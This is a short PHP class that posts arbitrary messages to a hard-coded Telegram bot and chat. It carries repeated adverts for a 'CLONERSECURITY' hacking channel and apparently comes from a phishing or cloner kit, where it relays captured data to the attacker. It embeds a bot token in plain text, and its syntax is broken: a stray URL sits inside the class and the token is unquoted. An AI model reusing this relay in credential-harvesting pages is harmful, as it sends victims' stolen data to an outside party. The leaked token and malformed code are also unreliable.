<?php
# https://t.me/CLONERSECURITY join us
class Telegram {
http://penetrationtest.blogfa.com/
    const CHAT_ID =75224801;
    const TOKEN =495414387:AAHWNf6_NGnYkav-uvHlHZu_9tMfZObgYtw;
# https://t.me/CLONERSECURITY join us
    public static function sendMessage($message)
    {
        $url = "https://api.telegram.org/bot" . self::TOKEN . "/sendMessage?chat_id=" . self::CHAT_ID;
        $url = $url . "&text=" . urlencode($message);
        $ch = curl_init();
        $optArray = array(
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true
        );
        curl_setopt_array($ch, $optArray);
        $result = curl_exec($ch);
        curl_close($ch);
    }
# https://t.me/CLONERSECURITY join us
}